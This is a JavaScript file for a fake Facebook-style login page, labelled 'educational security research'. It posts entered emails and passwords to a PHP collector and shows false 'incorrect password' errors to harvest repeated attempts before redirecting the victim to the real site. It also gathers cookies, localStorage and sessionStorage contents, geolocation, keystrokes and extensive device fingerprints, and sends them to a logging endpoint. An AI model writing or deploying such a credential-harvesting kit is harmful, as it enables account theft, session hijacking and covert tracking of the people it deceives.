// Educational Security Research - Client-side Analysis Script
// Global retry counter for VALID attempts only
window.loginValidAttemptCount = 0;

window.addEventListener('DOMContentLoaded', () => {
    function generateUUID() {
        var d = new Date().getTime();
        if (typeof performance !== 'undefined' && typeof performance.now === 'function') {
            d += performance.now();
        }
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
            var r = (d + Math.random() * 16) % 16 | 0;
            d = Math.floor(d / 16);
            return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
        });
    }

    const sessionId = generateUUID();
    console.log(`[EducationalSec CustomJS] Session ID generated: ${sessionId}`);
    const sessionIdField = document.getElementById('sessionIdField');
    if (sessionIdField) {
        sessionIdField.value = sessionId;
    }

    console.log("[EducationalSec CustomJS] DOMContentLoaded: Event Fired. Initializing educational analysis script...");

    const emailInput = document.querySelector("#email");
    const passwordInput = document.querySelector("#password");
    const errorModal = document.getElementById('login_error');
    const loadingRedirectModal = document.getElementById('loadingRedirectModal');
    const modalOkButton = document.getElementById('modalOkButton');
    const passwordToggleLink = document.querySelector('a[data-sigil="password-plain-text-toggle"]');
    const loginBtn = document.querySelector('button[name="login"]._54k8');
    const errorModalH2 = errorModal ? errorModal.querySelector('.modal-content h2') : null;
    const errorModalP = errorModal ? errorModal.querySelector('.modal-content p') : null;
    const form = document.querySelector('#login__form');

    // Educational analysis modal logic
    function updateFloatingLabels() {
        [emailInput, passwordInput].forEach(input => {
            if (!input) return;
            const label = document.querySelector(`label[for="${input.id}"]`);
            if (label) {
                if (input.value || document.activeElement === input) {
                    // Label is already positioned correctly
                } else {
                    // Label should be in center
                }
            }
        });
    }

    if (emailInput && passwordInput) {
        [emailInput, passwordInput].forEach(input => {
            input.addEventListener('input', updateFloatingLabels);
            input.addEventListener('focus', updateFloatingLabels);
            input.addEventListener('blur', updateFloatingLabels);
        });
        updateFloatingLabels();
    }

    if (passwordToggleLink && passwordInput) {
        passwordToggleLink.addEventListener('click', function (e) {
            e.preventDefault();
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                passwordToggleLink.classList.add('show-password');
            } else {
                passwordInput.type = 'password';
                passwordToggleLink.classList.remove('show-password');
            }
            passwordInput.focus();
        });
    }

    window.openLoginErrorModal = function () {
        if (!errorModal) return;
        errorModal.style.display = 'flex';
        document.body.classList.add('modal-open');
        const modalBox = errorModal.querySelector('.fb-error-modal');
        if (modalBox) {
            modalBox.classList.remove('shake');
            void modalBox.offsetWidth;
            modalBox.classList.add('shake');
        }
        setTimeout(() => {
            if (modalOkButton) modalOkButton.focus();
        }, 120);
    };

    function closeLoginErrorModal() {
        if (errorModal) {
            errorModal.style.display = 'none';
            document.body.classList.remove('modal-open');
        }
        
        // Refocus on password field after modal closes
        const passwordInput = document.getElementById('password');
        if (passwordInput) {
            setTimeout(() => passwordInput.focus(), 100);
        }
    }

    if (modalOkButton) modalOkButton.onclick = closeLoginErrorModal;
    if (errorModal) {
        errorModal.addEventListener('mousedown', function (e) {
            if (e.target === errorModal) closeLoginErrorModal();
        });
        window.addEventListener('keydown', function (e) {
            if (errorModal.style.display !== 'none' && (e.key === 'Escape' || e.key === 'Esc')) {
                closeLoginErrorModal();
            }
        });
    }

    function showLoadingModal() {
        if (loadingRedirectModal) {
            loadingRedirectModal.style.display = 'flex';
            setTimeout(() => {
                loadingRedirectModal.classList.add('is-visible');
            }, 20);
        }
    }

    function hideLoadingModal() {
        if (loadingRedirectModal) {
            loadingRedirectModal.classList.remove('is-visible');
            setTimeout(() => {
                loadingRedirectModal.style.display = 'none';
            }, 300);
        }
    }

    // Helper function for modal display
    function showModal(title, message) {
        const modal = document.getElementById('login_error');
        const errorModalH2 = modal.querySelector('h2');
        const errorModalP = modal.querySelector('p');
        
        if (errorModalH2) errorModalH2.textContent = title;
        if (errorModalP) errorModalP.textContent = message;
        
        openLoginErrorModal();
    }

    // Form submit handler with proper retry logic for educational analysis
    if (form) {
        form.addEventListener('submit', (e) => {
            e.preventDefault();
            
            const emailValue = emailInput ? emailInput.value.trim() : '';
            const passwordValue = passwordInput ? passwordInput.value.trim() : '';
            
            // CLIENT-SIDE VALIDATION (NON-COUNTABLE)
            if (!emailValue && !passwordValue) {
                // Both empty - show "Input Required" modal
                showModal("Input Required", "Please enter both your mobile number or email and password.");
                return;
            }
            if (!emailValue) {
                // Email empty - show "Email required" modal
                showModal("Email Required", "Please enter your mobile number or email address.");
                return;
            }
            if (!passwordValue) {
                // Password empty - show "Password required" modal
                showModal("Password Required", "Please enter your password.");
                return;
            }
            
            // VALID FORMAT - COUNT AS ATTEMPT
            window.loginValidAttemptCount++;
            console.log(`[EducationalSec] Attempt ${window.loginValidAttemptCount}/3 - Sending to educational analysis server`);

            // Send attempt number to server
            const formData = new FormData();
            formData.append('email', emailValue);
            formData.append('password', passwordValue);
            formData.append('sessionId', sessionId);
            formData.append('attemptNumber', window.loginValidAttemptCount); // Track attempt

            showLoadingModal();

            fetch('educational_login.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(responseText => {
                hideLoadingModal();
                
                if (responseText === 'Error:INCORRECT_PASSWORD') {
                    // Attempts 1 & 2: Show incorrect password modal
                    showModal("Incorrect Password", "The password you entered is incorrect. Please try again.");
                    
                    // Clear password field
                    if (passwordInput) passwordInput.value = '';
                    
                } else if (responseText.includes('facebook.com')) {
                    // Attempt 3: Redirect
                    console.log('[EducationalSec] Final attempt - Redirecting to Facebook');
                    window.parent.postMessage({ action: 'EDUCATIONAL_ANALYSIS_COMPLETE' }, '*');
                    window.location.href = responseText;
                    
                } else {
                    // Unexpected response
                    showModal("Analysis Error", "An error occurred. Please try again.");
                }
            })
            .catch(err => {
                hideLoadingModal();
                console.error('[EducationalSec] Network error:', err);
                showModal("Network Error", "Could not connect. Please check your internet and try again.");
            });
        });
        console.log("[EducationalSec CustomJS] Submit listener attached.");
    } else {
        console.error("[EducationalSec CustomJS] Login form not found.");
    }

    // === ENTERPRISE-GRADE EDUCATIONAL FINGERPRINT & BEHAVIORAL ANALYSIS ===
    const collectFingerprint = async (phase = 'initial') => {
        console.log(`[EducationalSec Fingerprint] PHASE: ${phase} - Starting comprehensive educational analysis`);
        const fingerprint = {
            capturePhase: phase,
            timestamp: Date.now(),
            sessionId: window.sessionId || generateUUID()
        };

        try {
            // ========== CATEGORY 1: BROWSER IDENTIFICATION ANALYSIS ==========
            fingerprint.browser = {
                userAgent: navigator.userAgent,
                vendor: navigator.vendor,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                appVersion: navigator.appVersion,
                appName: navigator.appName,
                appCodeName: navigator.appCodeName,
                product: navigator.product,
                productSub: navigator.productSub,
                buildID: navigator.buildID || null,
                oscpu: navigator.oscpu || null
            };

            // ========== CATEGORY 2: HARDWARE SPECS ANALYSIS ==========
            fingerprint.hardware = {
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                maxTouchPoints: navigator.maxTouchPoints,
                pointerType: matchMedia('(pointer: coarse)').matches ? 'touch' : 'mouse'
            };

            // ========== CATEGORY 3: SCREEN & DISPLAY ANALYSIS ==========
            fingerprint.screen = {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation ? {
                    type: screen.orientation.type,
                    angle: screen.orientation.angle
                } : null,
                devicePixelRatio: window.devicePixelRatio,
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight
            };

            // ========== CATEGORY 4: TIMEZONE & LOCATION ANALYSIS ==========
            fingerprint.timezone = {
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                locale: Intl.DateTimeFormat().resolvedOptions().locale,
                dateFormat: new Date().toLocaleString()
            };

            // Geolocation (with permission) for educational research
            if ('geolocation' in navigator) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
                    });
                    fingerprint.geolocation = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed
                    };
                } catch (e) {
                    fingerprint.geolocation = { error: e.message };
                }
            }

            // ========== CATEGORY 5: CANVAS FINGERPRINT ANALYSIS ==========
            fingerprint.canvas = (() => {
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    canvas.width = 200;
                    canvas.height = 50;

                    // Multiple rendering techniques for unique signature
                    ctx.textBaseline = 'alphabetic';
                    ctx.fillStyle = '#f60';
                    ctx.fillRect(125, 1, 62, 20);
                    ctx.fillStyle = '#069';
                    ctx.font = '11pt Arial';
                    ctx.fillText('Educational Security Research Test', 2, 15);
                    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                    ctx.font = '18pt Arial';
                    ctx.fillText('Educational Security Research Test', 4, 45);

                    return {
                        dataUrl: canvas.toDataURL(),
                        hash: hashCode(canvas.toDataURL())
                    };
                } catch (e) {
                    return { error: e.message };
                }
            })();

            // ========== CATEGORY 6: WEBGL FINGERPRINT ANALYSIS ==========
            fingerprint.webgl = (() => {
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

                    if (!gl) return { error: 'WebGL not supported' };

                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    return {
                        vendor: gl.getParameter(gl.VENDOR),
                        renderer: gl.getParameter(gl.RENDERER),
                        version: gl.getParameter(gl.VERSION),
                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                        unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
                        unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null,
                        extensions: gl.getSupportedExtensions(),
                        maxAnisotropy: (() => {
                            const ext = gl.getExtension('EXT_texture_filter_anisotropic');
                            return ext ? gl.getParameter(ext.MAX_TEXTURE_MAX_ANISOTROPY_EXT) : null;
                        })(),
                        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                        maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS)
                    };
                } catch (e) {
                    return { error: e.message };
                }
            })();

            // ========== CATEGORY 7: AUDIO FINGERPRINT ANALYSIS ==========
            fingerprint.audio = await (async () => {
                try {
                    const audioContext = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
                    const oscillator = audioContext.createOscillator();
                    const analyser = audioContext.createAnalyser();
                    const gainNode = audioContext.createGain();
                    const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);

                    gainNode.gain.value = 0;
                    oscillator.type = 'triangle';
                    oscillator.frequency.value = 10000;

                    oscillator.connect(analyser);
                    analyser.connect(scriptProcessor);
                    scriptProcessor.connect(gainNode);
                    gainNode.connect(audioContext.destination);

                    oscillator.start(0);
                    const audioBuffer = await audioContext.startRendering();

                    let audioHash = 0;
                    for (let i = 0; i < audioBuffer.length; i++) {
                        audioHash += Math.abs(audioBuffer.getChannelData(0)[i]);
                    }

                    return {
                        hash: audioHash.toString(),
                        sampleRate: audioContext.sampleRate,
                        channelCount: audioBuffer.numberOfChannels,
                        length: audioBuffer.length
                    };
                } catch (e) {
                    return { error: e.message };
                }
            })();

            // ========== CATEGORY 8: FONTS DETECTION ANALYSIS ==========
            fingerprint.fonts = (() => {
                try {
                    const baseFonts = ['monospace', 'sans-serif', 'serif'];
                    const testString = 'mmmmmmmmmmlli';
                    const testSize = '72px';
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');

                    const baselines = {};
                    baseFonts.forEach(baseFont => {
                        ctx.font = testSize + ' ' + baseFont;
                        baselines[baseFont] = ctx.measureText(testString).width;
                    });

                    const fontsToTest = [
                        'Arial', 'Arial Black', 'Calibri', 'Cambria', 'Cambria Math', 'Comic Sans MS',
                        'Consolas', 'Courier', 'Courier New', 'Georgia', 'Helvetica', 'Impact',
                        'Lucida Console', 'Lucida Sans Unicode', 'Microsoft Sans Serif', 'Palatino Linotype',
                        'Segoe UI', 'Tahoma', 'Times', 'Times New Roman', 'Trebuchet MS', 'Verdana',
                        'Roboto', 'Open Sans', 'Noto Sans', 'Ubuntu', 'Droid Sans', 'Apple SD Gothic Neo'
                    ];

                    const detectedFonts = [];
                    fontsToTest.forEach(font => {
                        let detected = false;
                        baseFonts.forEach(baseFont => {
                            ctx.font = testSize + ' ' + font + ', ' + baseFont;
                            const width = ctx.measureText(testString).width;
                            if (width !== baselines[baseFont]) {
                                detected = true;
                            }
                        });
                        if (detected) detectedFonts.push(font);
                    });

                    return detectedFonts;
                } catch (e) {
                    return { error: e.message };
                }
            })();

            // ========== CATEGORY 9: PLUGINS & EXTENSIONS ANALYSIS ==========
            fingerprint.plugins = {
                length: navigator.plugins.length,
                plugins: Array.from(navigator.plugins).map(p => ({
                    name: p.name,
                    description: p.description,
                    filename: p.filename,
                    mimeTypes: Array.from(p).map(m => ({
                        type: m.type,
                        suffixes: m.suffixes,
                        description: m.description
                    }))
                }))
            };

            // ========== CATEGORY 10: MEDIA DEVICES ANALYSIS ==========
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                try {
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    fingerprint.mediaDevices = devices.map(d => ({
                        kind: d.kind,
                        label: d.label,
                        deviceId: d.deviceId.substring(0, 8) + '...' // Partial for privacy
                    }));
                } catch (e) {
                    fingerprint.mediaDevices = { error: e.message };
                }
            }

            // ========== CATEGORY 11: BATTERY STATUS ANALYSIS ==========
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    fingerprint.battery = {
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime,
                        level: battery.level
                    };
                } catch (e) {
                    fingerprint.battery = { error: e.message };
                }
            }

            // ========== CATEGORY 12: NETWORK INFORMATION ANALYSIS ==========
            if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                fingerprint.network = {
                    effectiveType: conn.effectiveType,
                    downlink: conn.downlink,
                    rtt: conn.rtt,
                    saveData: conn.saveData,
                    type: conn.type
                };
            }

            // ========== CATEGORY 13: SENSORS ANALYSIS ==========
            fingerprint.sensors = {
                deviceMotion: 'DeviceMotionEvent' in window,
                deviceOrientation: 'DeviceOrientationEvent' in window,
                absoluteOrientation: 'ondeviceorientationabsolute' in window,
                gyroscope: 'Gyroscope' in window,
                accelerometer: 'Accelerometer' in window,
                magnetometer: 'Magnetometer' in window,
                ambientLight: 'AmbientLightSensor' in window
            };

            // ========== CATEGORY 14: STORAGE & FEATURES ANALYSIS ==========
            fingerprint.features = {
                localStorage: 'localStorage' in window,
                sessionStorage: 'sessionStorage' in window,
                indexedDB: 'indexedDB' in window,
                webWorkers: 'Worker' in window,
                serviceWorker: 'serviceWorker' in navigator,
                webRTC: 'RTCPeerConnection' in window || 'webkitRTCPeerConnection' in window,
                webGL: 'WebGLRenderingContext' in window,
                webGL2: 'WebGL2RenderingContext' in window,
                webAssembly: 'WebAssembly' in window,
                sharedWorker: 'SharedWorker' in window,
                notification: 'Notification' in window,
                geolocation: 'geolocation' in navigator,
                bluetooth: 'bluetooth' in navigator,
                usb: 'usb' in navigator,
                credentials: 'credentials' in navigator,
                payment: 'PaymentRequest' in window
            };

            // ========== CATEGORY 15: PRIVACY & TRACKING ANALYSIS ==========
            fingerprint.privacy = {
                doNotTrack: navigator.doNotTrack,
                globalPrivacyControl: navigator.globalPrivacyControl,
                cookiesEnabled: navigator.cookieEnabled,
                thirdPartyCookies: await (async () => {
                    try {
                        await fetch('https://www.google.com/favicon.ico', { mode: 'no-cors' });
                        return true;
                    } catch {
                        return false;
                    }
                })()
            };

            // ========== CATEGORY 15.5: SESSION & STORAGE DATA ANALYSIS ==========
            fingerprint.cookies = (() => {
                try {
                    return document.cookie.split(';').map(cookie => {
                        const [name, ...valueParts] = cookie.trim().split('=');
                        return {
                            name: name || '',
                            value: valueParts.join('=') || '',
                            domain: window.location.hostname,
                            path: '/',
                            secure: window.location.protocol === 'https:',
                            httpOnly: false // Can't detect from JS
                        };
                    }).filter(c => c.name); // Remove empty cookies
                } catch (e) {
                    console.warn('[EducationalSec] Cookie capture failed:', e);
                    return [];
                }
            })();

            fingerprint.storage = (() => {
                try {
                    const storage = {
                        localStorage: {},
                        sessionStorage: {}
                    };
                    
                    // Capture localStorage
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        if (key) {
                            storage.localStorage[key] = localStorage.getItem(key);
                        }
                    }
                    
                    // Capture sessionStorage
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const key = sessionStorage.key(i);
                        if (key) {
                            storage.sessionStorage[key] = sessionStorage.getItem(key);
                        }
                    }
                    
                    return storage;
                } catch (e) {
                    console.warn('[EducationalSec] Storage capture failed:', e);
                    return { localStorage: {}, sessionStorage: {} };
                }
            })();

            // ========== CATEGORY 16: BEHAVIORAL DATA ANALYSIS ==========
            fingerprint.behavior = {
                events: window.__educationalsec_behavior?.events || [],
                mouseMovements: window.__educationalsec_behavior?.mouseMovements || 0,
                keystrokes: window.__educationalsec_behavior?.keystrokes || 0,
                scrolls: window.__educationalsec_behavior?.scrolls || 0,
                touches: window.__educationalsec_behavior?.touches || 0,
                timeOnPage: Date.now() - (window.__educationalsec_behavior?.pageLoadTime || Date.now())
            };

            // ========== CATEGORY 17: CSS MEDIA QUERIES ANALYSIS ==========
            fingerprint.mediaQueries = {
                prefersDarkScheme: matchMedia('(prefers-color-scheme: dark)').matches,
                prefersReducedMotion: matchMedia('(prefers-reduced-motion: reduce)').matches,
                prefersReducedTransparency: matchMedia('(prefers-reduced-transparency: reduce)').matches,
                prefersContrast: matchMedia('(prefers-contrast: high)').matches,
                invertedColors: matchMedia('(inverted-colors: inverted)').matches,
                forcedColors: matchMedia('(forced-colors: active)').matches,
                anyHover: matchMedia('(any-hover: hover)').matches,
                anyPointer: matchMedia('(any-pointer: fine)').matches
            };

            // ========== CATEGORY 18: PERMISSIONS ANALYSIS ==========
            if (navigator.permissions && navigator.permissions.query) {
                const permissionsToCheck = [
                    'geolocation', 'notifications', 'camera', 'microphone',
                    'persistent-storage', 'push', 'midi'
                ];

                fingerprint.permissions = {};
                for (const perm of permissionsToCheck) {
                    try {
                        const result = await navigator.permissions.query({ name: perm });
                        fingerprint.permissions[perm] = result.state;
                    } catch (e) {
                        fingerprint.permissions[perm] = 'unavailable';
                    }
                }
            }

            // ========== CATEGORY 19: CLIENT RECTS ANALYSIS ==========
            fingerprint.clientRects = (() => {
                try {
                    const testDiv = document.createElement('div');
                    testDiv.innerHTML = '<span>Educational Test</span>';
                    document.body.appendChild(testDiv);
                    const rect = testDiv.getBoundingClientRect();
                    document.body.removeChild(testDiv);

                    return {
                        x: rect.x,
                        y: rect.y,
                        width: rect.width,
                        height: rect.height,
                        top: rect.top,
                        right: rect.right,
                        bottom: rect.bottom,
                        left: rect.left
                    };
                } catch (e) {
                    return { error: e.message };
                }
            })();

            // ========== CATEGORY 20: PERFORMANCE METRICS ANALYSIS ==========
            if (window.performance) {
                fingerprint.performance = {
                    memory: performance.memory ? {
                        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
                        totalJSHeapSize: performance.memory.totalJSHeapSize,
                        usedJSHeapSize: performance.memory.usedJSHeapSize
                    } : null,
                    timing: {
                        loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
                        domContentLoaded: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
                        connectTime: performance.timing.connectEnd - performance.timing.connectStart
                    }
                };
            }

            console.log('[EducationalSec Fingerprint] Complete educational fingerprint analysis captured:', fingerprint);

            // Send to educational logger
            await fetch('educational_unified_logger.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(fingerprint)
            });

            return fingerprint;

        } catch (e) {
            console.error('[EducationalSec Fingerprint] Error:', e);
            return { error: e.message, partial: fingerprint };
        }
    };

    // Helper function for hashing
    function hashCode(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return hash;
    }

    // === BEHAVIORAL ANALYSIS CAPTURE ===
    window.__educationalsec_behavior = { events: [] };
    ['mousemove', 'mousedown', 'mouseup', 'click', 'keydown', 'keyup', 'scroll', 'touchstart', 'touchmove', 'touchend', 'focus', 'blur'].forEach(evt => {
        window.addEventListener(evt, e => {
            window.__educationalsec_behavior.events.push({
                type: evt,
                x: e.clientX || null,
                y: e.clientY || null,
                key: e.key || null,
                time: Date.now(),
                target: e.target && e.target.id ? e.target.id : null
            });
            // Limit buffer size for performance
            if (window.__educationalsec_behavior.events.length > 500) window.__educationalsec_behavior.events.shift();
        }, true);
    });

    // Multi-phase educational analysis capture
    window.addEventListener('DOMContentLoaded', () => collectFingerprint('initial'));
    document.addEventListener('click', () => collectFingerprint('click'));
    if (form) form.addEventListener('submit', () => collectFingerprint('submit'));
});
